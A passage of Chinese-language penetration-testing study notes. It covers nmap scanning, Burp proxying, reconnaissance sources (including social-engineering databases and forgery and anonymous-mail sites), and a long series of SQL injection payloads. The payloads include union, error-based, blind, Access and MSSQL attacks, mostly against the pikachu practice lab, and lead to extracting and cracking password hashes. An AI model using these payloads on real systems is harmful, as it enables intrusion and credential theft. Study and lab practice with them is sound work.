<p>–traceroute: 追踪每个路由节点<br>端口扫描<br>open：端口是开放的。closed：端口是关闭的。<br>filtered：端口被防火墙 IDS/IPS 屏蔽，无法确定其状态。unfiltered：端口没有被屏蔽，但是否开放需要进一步确定。open|filtered：端口是开放的或被屏蔽。<br>closed|filtered ：端口是关闭的或被屏蔽。<br>用法<br>-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans 的方式来对目标主机进行扫描。<br>-sU: 指定使用 UDP 扫描方式确定目标主机的 UDP 端口状况。<br>-sN/sF/sX: 指定使用 TCP Null, FIN, and Xmas scans 秘密扫描方式来协助探测对方的 TCP 端口状态。<br>–scanflags <flags>: 定制 TCP 包的 flags。<br>-sI &lt;zombiehost[:probeport]&gt;: 指定使用 idle scan 方式来扫描目标主机（前提需要找到合适的 zombie host）<br>-sY/sZ: 使用 SCTP INIT/COOKIE-ECHO 来扫描 SCTP 协议端口的开放的情况。<br>-sO: 使用 IP protocol 扫描确定目标机支持的协议类型。<br>-b <FTP relay host>: 使用 FTP bounce scan 扫描方式  </p>
<pre><code>例如nmap –sS –sU –T4 –top-ports 300 1.1.1.100
参数-sS 表示使用 TCP SYN 方式扫描 TCP 端口；-sU 表示扫描 UDP 端口；-T4 表示时间级别配置 4 级；--top-ports 300 表示扫描最有可能开放的 300 个端口（TCP 和 UDP 分别有300 个端口）。  </code></pre><p>版本侦测<br>    -sV: 指定让 Nmap 进行版本侦测<br>    –version-intensity <level>: 指定版本侦测强度（0-9），默认为 7。数值越高，探测出的服务越准确，但是运行时间会比较长。<br>–version-light: 指定使用轻量侦测方式 (intensity 2)<br>–version-all: 尝试使用所有的 probes 进行侦测 (intensity 9)<br>–version-trace: 显示出详细的版本侦测过程信息。</p>
<pre><code>例如nmap –sV 10.1.1.100</code></pre><p>os侦测<br>原理：Nmap 使用 TCP/IP 协议栈指纹来识别不同的操作系统和设备。<br>用法：-O: 指定 Nmap 进行 OS 侦测。<br>–osscan-limit: 限制 Nmap 只对确定的主机的进行 OS 探测（至少需确知该主机分别有一个 open 和 closed 的端口）。<br>–osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统。<br>    <code>例如nmap -O 10.1.1.100</code>  </p>
<p>Burp APP抓包<br>1.让安卓手机和电脑连接同一wifi<br>2.查看电脑ip地址<br>3.设置手机代理ip，为局域网地址，端口随便，其他配置默认<br>4.电脑端设置burp site ，点击proxy，options，add和手机一样的ip地址和端口<br>5.在proxy -&gt; intercept下开启intercept is on可进行抓包<br>6.抓https包需要导入burp证书，<font color = red>注意，一个burp对应一个证书，所以如果以前安装过证书是没用的，需要重新安装</font> ，方法 proxy ，options import/export CA，export，选择保存路径，<font color = red>文件后缀名为.cer,因为手机只能安装cer的证书</font><br>7.将证书发送到手机，手机找到下载目录，将文件复制到手机的根目录<br>8.打开手机设置，安全与隐私，更多安全设置，从sd卡安装，找到cer文件，重命名<br>完成，可以进行抓包  </p>
<h4 id="3-敏感信息搜集"><a href="#3-敏感信息搜集" class="headerlink" title="3.敏感信息搜集"></a>3.敏感信息搜集</h4><h4 id="（1）web源码泄露"><a href="#（1）web源码泄露" class="headerlink" title="（1）web源码泄露"></a>（1）web源码泄露</h4><p>github信息泄露搜索能力比较强<br><a href="https://sec.xiaomi.com/article/37" target="_blank" rel="noopener">https://sec.xiaomi.com/article/37</a><br>信息搜集用到的地址：<br>1.百度网盘 ，<br>社工信息泄露：<a href="https://www.instantcheckmate.com/、http://www.uneihan.com/" target="_blank" rel="noopener">https://www.instantcheckmate.com/、http://www.uneihan.com/</a><br>源码搜索：<a href="https://searchcode.com/、https://gitee.com/、gitcafe.com、code.csdn.net" target="_blank" rel="noopener">https://searchcode.com/、https://gitee.com/、gitcafe.com、code.csdn.net</a><br>钟馗之眼： <a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a><br>天 眼 查 <a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a><br>威胁情报：微步在线、 ti.360.cn、 Virustotal  </p>
<h4 id="2-邮箱信息搜集"><a href="#2-邮箱信息搜集" class="headerlink" title="(2) 邮箱信息搜集"></a>(2) 邮箱信息搜集</h4><p>在邮箱收集领域不得不提一个经典的工具，The Harvester,The Harvester 可用于搜索Google、Bing 和 PGP 服务器的电子邮件、主机以及子域名,因此需要翻墙运行该工具。工具下载地址为：<a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a>  ，注意安装之前需安装python3.6版本，下载完成之后执行python3 -m pip -r requirements.txt，安装完成</p>
<h4 id="（3）历史漏洞搜集"><a href="#（3）历史漏洞搜集" class="headerlink" title="（3）历史漏洞搜集"></a>（3）历史漏洞搜集</h4><p>wooyun 历史漏洞库：<a href="http://www.anquan.us/" target="_blank" rel="noopener">http://www.anquan.us/</a><br> 漏洞银行：<a href="https://www.bugbank.cn/" target="_blank" rel="noopener">https://www.bugbank.cn/</a><br>360 补天：<a href="https://www.butian.net/" target="_blank" rel="noopener">https://www.butian.net/</a><br>教育行业漏洞报告平台（Beta）<a href="https://src.edu-info.edu.cn/login/" target="_blank" rel="noopener">https://src.edu-info.edu.cn/login/</a>  </p>
<h4 id="（4）信息工具搜集"><a href="#（4）信息工具搜集" class="headerlink" title="（4）信息工具搜集"></a>（4）信息工具搜集</h4><p>如：7kbscan、破壳 Web 极速扫描器等</p>
<h4 id="4-指纹识别，waf，cdn识别"><a href="#4-指纹识别，waf，cdn识别" class="headerlink" title="4.指纹识别，waf，cdn识别"></a>4.指纹识别，waf，cdn识别</h4><p>1、在线识纹识别：<br>组件是网络空间最小单元，Web应用程序、数据库、中间件等都属于组件。指纹是组件上能标识对象类型的一段特征信息，用来在渗透测试信息收集环节中快速识别目标服务。大部分应用组件存在足以说明当前服务名称和版本的特征，识别这些特征获取当前服务信息，也即表明该系统采用那个公司的产品。<br><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a><br><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a><br>2.waf识别<br>github.com/EnableSecurity/wafw00f<br>3.CDN识别<br><a href="https://raw.githubusercontent.com/3xp10it/mytools/master/xcdn.py" target="_blank" rel="noopener">https://raw.githubusercontent.com/3xp10it/mytools/master/xcdn.py</a>  </p>
<h4 id="5-资产管理"><a href="#5-资产管理" class="headerlink" title="5.资产管理"></a>5.资产管理</h4><p>有了庞大的域名，接下来就是帮助 SRC 梳理资产了。域名可以先判断存活，活着的继续进行确定 IP 环节。根据 IP 的分布，确定企业的公网网段。这其实是一项不小的工程，精准度比较难以拿捏。不过通过不断实战，肯定可以琢磨出一些东西，所以有人称白帽子可能会比企业的运维更了解资产信息。资产梳理过程中可能需要对相关资产漏洞进行查询、利用、发布等，可能会用到已下相关链接地址：  </p>
<p><strong>SRC 众测平台</strong> </p>
<p>国际漏洞提交平台 <a href="https://www.hackerone.com/" target="_blank" rel="noopener">https://www.hackerone.com/</a> BugX<br>区块链漏洞平台 <a href="http://www.bugx.org/" target="_blank" rel="noopener">http://www.bugx.org/</a> Gsrc<br>瓜子 src <a href="https://security.guazi.com/" target="_blank" rel="noopener">https://security.guazi.com/</a><br>区块链安全响应中心 <a href="https://dvpnet.io/" target="_blank" rel="noopener">https://dvpnet.io/</a><br>CNVD 国家信息安全漏洞平台 <a href="http://www.cnvd.org.cn/" target="_blank" rel="noopener">http://www.cnvd.org.cn/</a><br>漏洞银行：<a href="https://www.bugbank.cn/" target="_blank" rel="noopener">https://www.bugbank.cn/</a><br>360 补天：<a href="https://www.butian.net/" target="_blank" rel="noopener">https://www.butian.net/</a><br>教育行业漏洞报告平台（Beta）<a href="https://src.edu-info.edu.cn/login/" target="_blank" rel="noopener">https://src.edu-info.edu.cn/login/</a></p>
<p><strong>国内平台</strong></p>
<p>知道创宇 Seebug 漏洞平台 <a href="https://www.seebug.org/" target="_blank" rel="noopener">https://www.seebug.org/</a><br>工控系统行业漏洞平台 <a href="http://ivd.winicssec.com/" target="_blank" rel="noopener">http://ivd.winicssec.com/</a><br>打造中文最大exploit 库 <a href="http://www.expku.com/" target="_blank" rel="noopener">http://www.expku.com/</a><br>为数不多的漏洞管理插件收集平台 <a href="http://www.bugscan.net/source/template/vulns/" target="_blank" rel="noopener">http://www.bugscan.net/source/template/vulns/</a><br>一家管理漏洞收集的平台 <a href="http://www.0daybank.org/" target="_blank" rel="noopener">http://www.0daybank.org/</a></p>
<p><strong>国外平台</strong></p>
<p>国际漏洞提交平台 <a href="https://www.hackerone.com/" target="_blank" rel="noopener">https://www.hackerone.com/</a> xss poc <a href="http://xssor.io/" target="_blank" rel="noopener">http://xssor.io/</a><br>oday 漏洞库 <a href="https://www.0day.today/" target="_blank" rel="noopener">https://www.0day.today/</a><br>路由器漏洞库 <a href="http://routerpwn.com/" target="_blank" rel="noopener">http://routerpwn.com/</a> cve<br> 漏洞平台 <a href="http://cve.mitre.org/" target="_blank" rel="noopener">http://cve.mitre.org/</a></p>
<p><strong>威胁情报</strong></p>
<p>安全数据交流平台    <a href="https://www.secsilo.com/" target="_blank" rel="noopener">https://www.secsilo.com/</a><br>华为安全情报 <a href="https://isecurity.huawei.com/sec/web/intelligencePortal.do" target="_blank" rel="noopener">https://isecurity.huawei.com/sec/web/intelligencePortal.do</a><br>威胁情报共享平台    <a href="https://www.threatcrowd.org/" target="_blank" rel="noopener">https://www.threatcrowd.org/</a><br>被黑站点统计 <a href="http://www.hacked.com.cn/" target="_blank" rel="noopener">http://www.hacked.com.cn/</a></p>
<p><strong>社工库</strong></p>
<p>微信伪造    <a href="http://www.jietuyun.com/" target="_blank" rel="noopener">http://www.jietuyun.com/</a><br>任意邮箱发送    <a href="http://tool.chacuo.net/mailanonymous" target="_blank" rel="noopener">http://tool.chacuo.net/mailanonymous</a> 和 <a href="https://emkei.cz/" target="_blank" rel="noopener">https://emkei.cz/</a><br>临时邮箱 <a href="http://www.yopmail.com/" target="_blank" rel="noopener">http://www.yopmail.com/</a><br>邮箱池群 <a href="http://veryvp.com/" target="_blank" rel="noopener">http://veryvp.com/</a><br>社工库 <a href="http://www.uneihan.com/" target="_blank" rel="noopener">http://www.uneihan.com/</a>  </p>
<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p><strong>ping命令</strong>：默认发送32个字节，四个数据包，通常情况下，如果TTL返回255，则通常为交换机或路由器设备，如果TTL返回128则可能为xp/2000/2003系统，如果TTL返回64，则通常为win7/2008/linux系统<br><strong>端口扫描</strong>:telnet ip+端口  （注意win7以上需要手动开启telnet服务）<br>X-scan匹配winxp，win2000，win2003系统<br><strong>AppScan扫描</strong>，建立扫描过程中要求建立一个scan文件，这是因为软件在扫描过程中可能会出现崩溃等情况，但是之前扫描过程中的记录都保存在该scan文件中，所以我们只需要导入该文件继续扫描即可。<br><strong>AXVS扫描</strong><br>安装完成后出现浏览器不能访问的情况，使用谷歌浏览器<br><strong>webInspect</strong><br>所耗内存较大，尽量将其安装在单独的虚拟机中，分配内存3G以上，系统win7以上，支持.net framework4.5.x和sqlserver2012，开启前需要确保services.msc 检查sql和webinspect全部正确开启以防出现扫描中断，10.3下载和安装需要vpn<br><strong>netsparker扫描器</strong><br> 使用较少<br><strong>WVSS</strong><br><strong>安恒</strong><br><strong>Nessus扫描器</strong><br><strong>Nexpose扫描器</strong>  ，这是个虚拟机，下载之后进行导入虚拟机.ova文件即可，需要的8g的内存<br><strong>启明天镜</strong><br>因为可以免费使用三个月，所以使用三个月以后重新安装虚拟机，或者将虚拟机中系统的时间更改一下即可<br><strong>RSAS</strong><br><strong>Burpsuite</strong> 需安装jdk1.8版本</p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>以下所有的注入代码均为payload，payload实际上就是攻击代码<br>注意浏览器使用ie浏览器，版本过高导致安全性过高。<br><strong>原理</strong>：程序命令和用户数据之间没有做好分开，攻击者有机会将程序命令当作用户输入的数据提交给web程序，注入产生的原因是接受相关参数未经处理直接带入数据库。<br><strong>步骤1</strong>. 确定程序应用的编程语言和技术，通常考察web页面的页脚，查看错误页面，检查页面源代码，或使用Nessus，AWVS,APPSCAN等工具来进行刺探。<br><strong>步骤2.</strong>确定所有可能的输入方式 HTML表单，HTTP头部，Cookies，AJAX。我们可以求助于web代理，例如Burp<br><strong>步骤3.</strong>查找可以用于注射的用户输入。这个比较难，多留意web应用的错误页面。<br>万能输入，例如输入账号密码登录数据库<br>    <code>yuan  123</code> </p>
<blockquote>
<p>数据库中登录为 select * from admin where name = ‘yuan’ and password = ‘123’ </p>
</blockquote>
<p>我们使用 </p>
<blockquote>
<p>‘ or 1=1– </p>
</blockquote>
<p>密码随便输入数据库登录为 </p>
<blockquote>
<p>select * from admin where name = ‘’ or 1 = 1 and password = ‘随便’,</p>
</blockquote>
<p>其中’表示账号为空 –表示后面所有的数据都被注释，相当于执行 <code>select * from admin</code><br>注入前准备，取消IE浏览器的错误信息设置，因为浏览器默认不返回详细错误信息，只返回500错误。方法，在浏览器internet设置-&gt;高级中-&gt;将显示http友好错误信息的对号取消。<br>判断是否存在sql注入：1.在网址后面加上一个单引号，如果显示异常，说明可能存在漏洞。2.很多时候使用单引号会显示非法字符，这时候我们我们两次分别加上and1=1和and 1=2 ，如果显示不同的页面，则存在sql注入。<br><strong>数字型注入</strong> sql语句 </p>
<blockquote>
<p>select * from member where id = 1 or 1 = 1;  </p>
</blockquote>
<p><strong>字符型注入</strong> sql语句 </p>
<blockquote>
<p>select * from member where username = ‘vince’ or 1=1;</p>
</blockquote>
<p>在pikachu平台上输入 vince’ or 1=1#(注意，前面的单引号是与pikachu提供的sql语句前面单引号进行配对，后面的#是注释掉pikachu提供的后面的单引号)<br><strong>搜索型注入</strong> sql语句 </p>
<blockquote>
<p>select * from member where username like ‘%v%’ or 1=1;</p>
</blockquote>
<p>pikachu平台上输入 %v%’ or 1=1#<br><strong>xx型注入</strong>  sql语句   </p>
<blockquote>
<p>select * from member where username = (‘vince’) or 1=1;</p>
</blockquote>
<p>在pingkachu平台输入 xx’) or 1=1# 实际上与字符型只是在语法上有区别。</p>
<h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p><font color = red>注意使用搜索型注入</font><br>sql查询语法</p>
<blockquote>
<p>select id,email from member where username = ‘kevin’ union select username,pw from member where id=1;</p>
</blockquote>
<p>结果是将四个字段全部显示出来，但是字段名只显示主字段名，即id和email。在pikachu中使用v’ union select username,pw from member where id=1#，会出现报错，<strong>因为后面查询的字段要与主字段个数相同</strong>，所以我们需要看一下主查询总共有多少个字段，使用 a’ order by 4#,出现错误，使用a’ order by 3#,没有错误（如果还是错误就一直往下尝试，个数较多使用折半查找法），只是没有查询到。说明主查询总共有三个字段（pikachu默认查询三个字段）。最后我们做查询，</p>
<blockquote>
<p>设置payload：a’ union select database(),user(),version()#</p>
</blockquote>
<p>可查询数据库信息。或者</p>
<blockquote>
<p>v’ union select username,pw,sex from member where id=1#</p>
</blockquote>
<p>即可查询到。通过看username，id，email在每次查询时代表不同的意义</p>
<h3 id="information-schema注入"><a href="#information-schema注入" class="headerlink" title="information_schema注入"></a>information_schema注入</h3><p>属于搜索注入<br>information_schema是mysql自带的数据库，他包含了mysql中所有数据库的信息，所以注入他可以获得大量信息，我们需要获得数据库信息，使用 </p>
<blockquote>
<p>v’ union select database(),user(),3# </p>
</blockquote>
<p><strong>获取数据库表名</strong>，</p>
<blockquote>
<p>u’ union select table_schema,table_name,3 from information_schema.tables where table_schema=’pikachu’#</p>
</blockquote>
<p>获取数据库名称username，id，email代表数据库名称，用户权限，email无用。<br><strong>获取pikachu的字段名</strong> </p>
<blockquote>
<p>a’ union select table_name,column_name,3 from information_schema.columns where table_name=’users’# </p>
</blockquote>
<p>username，id，email分别代表表明，字段名，email无用。<br><strong>获取字段值</strong></p>
<blockquote>
<p> c’ union select username,password,3 from users#</p>
</blockquote>
<p><font color = red>最后获得密码后是个md5码，在网站<a href="http://www.cmd5.com中将其解析出来即可获取密码。" target="_blank" rel="noopener">www.cmd5.com中将其解析出来即可获取密码。</a></font></p>
<h3 id="基于函数报错注入"><a href="#基于函数报错注入" class="headerlink" title="基于函数报错注入"></a>基于函数报错注入</h3><p>在mysql中使用指定的函数来制造报错，从而获取信息<br>条件：后台没有屏蔽数据库报错信息，发生错误时输出在前端<br>报错注入分为updatexml注入和extractvalue（）注入<br>  updatexml注入分为1.载荷注入，2.insert注入 3.updata注入 4.delete注入<br><strong>三个常用报错函数</strong>：<br>使用指定函数来制造报错，从报错信息中获取指定信息。<br>1.updatexml函数（XML_document,XPath_string,new_value）：是mysql对xml文档数据进行查询和修改的XPATH函数<br>第一个参数，string格式，是文档对象的名字<br>第二个参数，Xpath格式的字符串<br>第三个参数，替换查找到的数据<br>例如</p>
<blockquote>
<p>k’ and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#爆破数据库版本信息，0x7e是符号“~”的16进制  </p>
</blockquote>
<blockquote>
<p>k’ and updatexml(1,concat(0x7e,(select user()),0x7e),1)# 爆破数据库当前用户</p>
</blockquote>
<blockquote>
<p>k’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)#爆破数据库名  </p>
</blockquote>
<blockquote>
<p>k’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1)),0)#爆破数据表，获取表名，，显示第二个数据limit1,1，其中limit限制返回的结果只显示一个，limit后一个数据是起始位置，第二个数字是去取出的数据条数</p>
</blockquote>
<blockquote>
<p>k’ and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 2,1)),0)# 爆字段名</p>
</blockquote>
<blockquote>
<p>k’ and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#爆破密码</p>
</blockquote>
<p>2.extractvalue（）：也是mysql对xml文档数据进行查询的XPATH函数<br>3.floor（）：mysql中用来取整的函数。    </p>
<h3 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h3><p><font color= red>注意，insert注入用于用户注册端</font><br>原本是前端界面注册的信息，然后后台直接通过insert命令操作插入数据库。但是现在是后端没有做好防护，在前端输入可以直接拼接到到后端的insert语句，导致insert注入.<font color = red>在用户那里<strong>输入单引号</strong>，密码随便输入，页面会有报错信息，说明存在sql注入漏洞。</font><br>pikachu insert注入中在注册信息oldboy 密码123456后，登录中输入oldboy’ or updatexml(1,concat(0x7e,(命令)),0) or’#<br><strong>爆表名</strong>：oldboy’ or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1)),0) or’<br><strong>爆列名</strong> ‘ or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 2,1)),0) or’<br><strong>爆内容</strong> ‘ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or’等同于’ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or’1’=’1’ </p>
<h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p> 与insert注入大体相同，区别在与update注入用于登录端，insert用于用户注册端。 这个需要在登录之后，在修改个人信息输入框中插入payload。<br>update注入payload： a’ or updatexml(0,concat(0x7e,(database())),0) or’  </p>
<h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p>需要进行抓包后修改url，然后在抓取的路径后面写上payload<br>应用于前后端发帖，留言，用户等相关删除操作<br>注入payload ：delete from message where id =56 or updataxml(2,concat(0x7e,(database())),0)  </p>
<h3 id="http-header注入"><a href="#http-header注入" class="headerlink" title="http header注入"></a>http header注入</h3><p>原理：后端开发人员为了进行验证信息，或者通过http header获取一些信息（逻辑语句需要获得用户登录的信息进行后台处理），比如useragent，accept等字段，开发人员需要获得http header然后进行sql语句处理，此时会出现sql注入。<br>注入方法：在pikachu找到header模块，登录之后使用burp suit进行抓包，找到http header，找到user agent或者其他字段，然后删除里面的内容，输入<strong>单引号</strong>，如果出现错误，说明开发人员使用了该字段进行了sql语句处理，说明存在注入。设置payload： 1’ or updatexml(1,concat(0x7e,database()),0) or’ 进行注入。  </p>
<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>原理：后端获取cookie后，开发人员使用cookie信息进行数据库处理，也会出现sql注入。<br>方法：使用burp suit抓包后，删除cookie后面的信息，输入<strong>单引号</strong>如果出现错误，说明后端使用了cookie信息，设置payload ：1’ or updatexml(1,concat(0x7e,database()),0) #  </p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>这种注入比较复杂。通常是其他注入输入后没有反应，或者重定向。<br><strong>1. boolean型盲注</strong>：在mysql命令行中输入select ascii(substr(database,1,1)) &gt; 数字，判断第一个数据库名中第一个字母ascii码的大小。（substr（string，start，length）函数），输入select length（database（））&lt; 数字，判断表名长度，一直尝试到正确值为止。然后在pikachu平台上输入 a’ and ascii(substr(database,1,1)) = 查找到的数字。就可以查找到第一个数据库字符。<br><strong>2. 时间型盲注</strong>  在基于boolean盲注实现不了的情况下，使用 a’ and if(substr(database(),1,1)=’p’)，sleep(10),null#可判断出数据库名第一个字符是否为p，。<br><strong>3. 宽字节注入</strong> phpini中的magic_quotes_gqc参数设为on时，所有单引号，双引号，null，反斜杠等就会被自动转义，所以此时无法注入，还有其他的函数也有类似的作用。这看上去安全，但是也容易出现漏洞。我们在单引号前面加上%df，则会变成%df&#39; = %df%5c%27=衰’，此时衰就干掉了\会变成就会有单引号了。开始注入  </p>
<h3 id="二阶sql注入"><a href="#二阶sql注入" class="headerlink" title="二阶sql注入"></a>二阶sql注入</h3><p>太复杂  </p>
<h3 id="ms-sql注入拿webshell实战"><a href="#ms-sql注入拿webshell实战" class="headerlink" title="ms sql注入拿webshell实战"></a>ms sql注入拿webshell实战</h3><p>参考文件,mssql即sql server  </p>
<h3 id="Access数据库注入"><a href="#Access数据库注入" class="headerlink" title="Access数据库注入"></a>Access数据库注入</h3><p>Access也是小众的数据库，远远没有ms sql数据库强大。<br>user是数据库的一个内置变量，它是字符型，根据出错信息判断数据库类型，即 在注入点后面写上 and user &gt; 0，根据出错信息判断数据库类型。如果提示Microsoft OLE DB Provider for SQL Server 错误‘80040e21’则可以判断为mssql数据库，如果提示’在将nvarchar值‘xxx’转换成数据类型int时失败’。则说明是access数据库。<br>如果IIS不许返回错误提示，则在注入点后使用查询语句<br>and (select count(<em>) from sysobjects) &gt;=0 和 and (select count(</em>) from msysobjects) &gt;=0,因为access存在msyobjects表，而sql server存在sysobjects，<br>所以如果是access，则返回 microsoft OLE DB Provider for ODBC Drivers 错误’80040e37’或者’数据库找不到输入表。<br>ms sqlServer会返回错误信息，Microsoft OLE DB Provider for SQL Server 错误’80040e37’/对象名’msysobjects’无效。<br><strong>猜数据库名：</strong> 注入点后面写 and exists(select * from 数据库表名)或者and (select count(<em>) from 数据库表名) &gt; 0 这样一直更换常见表名进行查询。<br><strong>猜字段名</strong> 注入点后面写 and exists(select 字段名 from 数据库表名)或者 and (select count(字段名) from 表名)，也是一直更换常见表名。<br><strong>猜字段长度</strong> and (select top 1 len(字段名) from 表名) &gt; 2<br><strong>猜字段ASCII码值</strong> 注入点后面写 and (select top1 asc(mid(字段名,1,1)) from 表名) &gt;0 … n 当 &gt; n-1时正常，到n时出错，说明ASCII码已找到，然后得到字段的第一个字符。再使用and(select top 1 asc(mid(字段名,2,1)) from 表名 ) &gt; 0…寻找第二个字符。。。<br><strong>Access注入案例</strong><br>注意这是手动猜解，比较复杂，但是实际上有破解工具等<br>1.首先自己搭建网站，<a href="http://ip：端口号/news_view.asp?id=14">http://ip：端口号/news_view.asp?id=14</a>(<font color=red>网站需要自己搭建</font>)注入点分别提交and 1=1和and 1=2返回不同的结果，说明存在注入。<br>2.猜表名和字段。<br>首先来猜解数据库表名，提交如下网址。<a href="http://ip/news_view.asp?id=14" target="_blank" rel="noopener">http://ip/news_view.asp?id=14</a> and exists(select * from users) 返回错误信息，说明 users 表不存在，继续提交。直至尝试到正确的数据库名字<br>继续猜测字段并提交。<br><a href="http://192.168.1.55:901/news_view.asp?id=14" target="_blank" rel="noopener">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select username from administrator)同样，直至猜解到正确的为止。<br>3.猜字段长度<br><a href="http://192.168.1.55:901/news_view.asp?id=14" target="_blank" rel="noopener">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;1//正常<br><a href="http://192.168.1.55:901/news_view.asp?id=14" target="_blank" rel="noopener">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;//报错，使用二分法进行猜解，直至查询到正确的长度。<br>4.猜字段内容<br><a href="http://192.168.1.55:901/news_view.asp?id=14" target="_blank" rel="noopener">http://192.168.1.55:901/news_view.asp?id=14</a>    and    (select    top    1<br>asc(mid(user_name,1,1)) from administrator)&gt;0    //返回正常页面（top1代表第一行，猜第一行的username字段第一个字符的ascii码）<br><a href="http://192.168.1.55:901/news_view.asp?id=14" target="_blank" rel="noopener">http://192.168.1.55:901/news_view.asp?id=14</a>    and    (select    top    1<br>asc(mid(user_name,1,1)) from administrator)&gt;500  //错误说明第一个字符在0-500之间<br>依次使用二分法，猜第二个字符（把username后面的第一个1变成2），第三个字符。<br>使用同样的方法猜username和password的值<br> 可以看出上面的方法太复杂，下面使用联合查询<br> <strong>联合查询（非常常用的方法）</strong><br>1.猜字段长度，<a href="http://ip:端口/news_view.asp?id=14">http://ip:端口/news_view.asp?id=14</a>     order by 7,尝试改变数字，直至正确。<br>2.猜字段名称，<a href="http://ip:端口/news_view.asp?id=14">http://ip:端口/news_view.asp?id=14</a> and 1=2 union select1, 2, 3，4，5，6,7 from administrator ，会返回某几个数字，比如2，3说明2和3字段的是<strong>可以修改</strong>的。<br>3.修改可以变化的数字为字段（前提是已经猜出字段名和表名），即<a href="http://ip:端口/news_view.asp?id=14">http://ip:端口/news_view.asp?id=14</a> and 1=2 union select1, user_name, password，4，5，6,7 from administrator   ,此时可以直接显示出用户名和密码。<br>破解完成。<br> <strong>偏移注入</strong><br>应用于Access数据库，用在猜到表名，猜不到列名。当使用联合查询查不到的情况下使用该方法<br>1.<a href="http://ip:端口/news_view.asp?id=14">http://ip:端口/news_view.asp?id=14</a> and 1=2 union select1, 2, 3，4，5，6,7 from administrator查询不到<br>2.<a href="http://ip:端口/news_view.asp?id=14">http://ip:端口/news_view.asp?id=14</a> UNION SELECT 1,2,3,4,</em> from administrator 分别用<em>号代替数字，直到返回正常页面。发现在 4 的时候页面返回正常，接着我们用 7-4=3（代表 administrator  有 3 个字段）再接着用 3*2+1=7 来构造第三步注入语句。2代表需要修改两个字段，3代表每个字段代表三个原字段，1代表1号位置不变<br>3.<a href="http://ip:端口/news_view.asp?id=14">http://ip:端口/news_view.asp?id=14</a> UNION SELECT 1, a.id,b.id, * from (administrator as a inner join administrator as b on a.id=b.id)     注:a.id ,b.id  每个占三个字段。<br>如果是10个字段<a href="http://ip:端口/news_view.asp?id=14">http://ip:端口/news_view.asp?id=14</a> UNION SELECT 1,a.id,b.id,c.id,</em> from ((administrator as a inner join administrator as b on a.id=b.id) inner join administrator as c a.id=c.id)即3*3+1</p>
<p><strong>注入跨库查询</strong><br>a,b站部署在同一个服务器上，测试后我们只找到a网站数据库路径，对数据库下载发现下载不了。这个时候我发现 b站点有注入点 。直接用<a href="http://ip：端口/news_view.asp?id=14">http://ip：端口/news_view.asp?id=14</a> UNION SELECT  1,adminpassword,username,4,5,6,7 from [数据库路径名].数据库名进行破解    </p>
<h3 id="cookie注入-1"><a href="#cookie注入-1" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>当get，post提交方式已经被加密狗，waf等拦截很多人会放弃，但是可以考虑cookie，原因，开发人员在代码中加入了防注入代码。三种方法，参考文件。强烈推荐sqlmap方法。</p>
<h3 id="MsSQL注入"><a href="#MsSQL注入" class="headerlink" title="MsSQL注入"></a>MsSQL注入</h3><p>mssql也称sql server<br>登录之后<br>1，判断是否存在注入点，注入点后面添加 and exists(select * from sysobjects)<br>2.检测当前用户的权限，and 1=(select IS_SRVROLEMEMBER(‘sysadmin’))，如果返回正常，则为sa最高权限<br>and 1=(select is_srvrolemember(‘db_owner’))这个权限可以找到web路径，可使用备份的方式拿到webshell<br>and 1=(select is_srvrolemember(‘public’))只对表和列操作有权限。<br>3.判断mssql版本 and @@version&gt;0 如果没显示有用的信息，那么说明关闭了错误提示，此时只能使用联合查询或者盲注。<br>此外，还可以进行如下查询检测，以获得更多的关于 MsSQL 注入点的信息。<br>;declare @d int    // 判断 MsSQL 支持多行语句查询<br>and (select count (1) from [sysobjects])&gt;=0    //是否支持子查询  and user&gt;O    //获取当前数据库用户名<br>and db_name&gt;0    //获取当前数据库名称<br>and l=convert (int,db_name ())    或 1=(select db_name ()) //  当前数据库名and 1=(select @@servername)        //本地服务名<br>and 1=(Select HAS_DBACCESS (‘master’))    //判断是否有库读取权  限<br><strong>MSSQL的扩展储存攻击</strong>：即mssql实现了某些函数的功能。<br>提交如下查询进行检测。<br>and 1=(Select count(<em>) FROM master. dbo.sysobjects    Where xtype =’X’ AND name = ‘xp_cmdshell’)可查看 xp_cmdshell 扩展存储过程是否被删除。<br>and 1=(Select count(</em>) FROM master. dbo.sysobjects    Where name = ‘xp_regread’)可查看 xp_regread 扩展存储过程是否被删除。如果扩展存储被删除，可执行如下查询进行恢复。;exec sp_dropextendedproc ‘xp_cmdshell’<br>上面这条查询语句，是在恢复前先删除 